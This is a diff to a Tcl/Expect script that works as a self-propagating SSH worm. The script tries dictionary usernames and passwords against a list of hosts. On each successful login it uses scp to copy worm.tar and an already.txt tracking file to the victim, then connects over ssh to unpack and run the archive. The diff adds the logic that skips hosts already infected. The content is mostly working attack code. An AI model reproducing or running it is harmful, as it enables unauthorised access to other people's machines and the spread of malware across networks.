@@ -18,27 +18,62 @@ if {[llength $argv] != 3} {
 set dictionary [lindex $argv 0]
 set file [lindex $argv 1]
 set user [lindex $argv 2]
-
+set already already.txt
 
 
 set tryHost [open $file r]
 set tryPass [open $dictionary r]
 set tryUser [open $user r]
+set alreadyHost [open $already r]
 
 set passwords [read $tryPass]
 set hosts [read $tryHost]
 set login [read $tryUser]
+set alreadys [read $alreadyHost]
+
+close $tryPass
+close $tryHost
+close $tryUser
+close $alreadyHost
+
+set targets []
+
+# Avoid infinite loop
+foreach h $hosts {
+    set f 0
+    foreach a $alreadys {
+        if {$h == $a} {
+            set f 1
+        }
+    }
+    if {$f == 0} {
+        append targets " " $h
+    }
+}
 
 spawn $env(SHELL)
 
 
 proc after_login {ip username passwd} {
-    # after login, this exits, sends a compressed file to the server
+    # after login, this adds the ip address to already.txt,
+    # exits, sends a compressed file and already.txt
+    # to the next node
+    set already already.txt
+    set alreadyHost [open $already a]
+    puts $alreadyHost "$ip"
+    close $alreadyHost
+
     send "exit\n"
+
     expect -- "\$ "
     send -- "scp ./worm.tar $username@$ip:~\n"
     expect -nocase "password: "
     send -- "$passwd\n"
+    expect -- "\$ "
+    send -- "scp $already $username@$ip:~\n"
+    expect -nocase "password: "
+    send -- "$passwd\n"
+
     # After successfully sending the file, this uncompress and executes it.
     expect -- "\$ "
     send -- "ssh $username@$ip\n"
@@ -60,7 +95,7 @@ proc after_login {ip username passwd} {
 
 foreach username $login {
     foreach passwd $passwords {
-        foreach ip $hosts {
+        foreach ip $targets {
 #            puts stderr "execute ssh"
             expect "\$ "
             send -- "ssh $username@$ip\n"
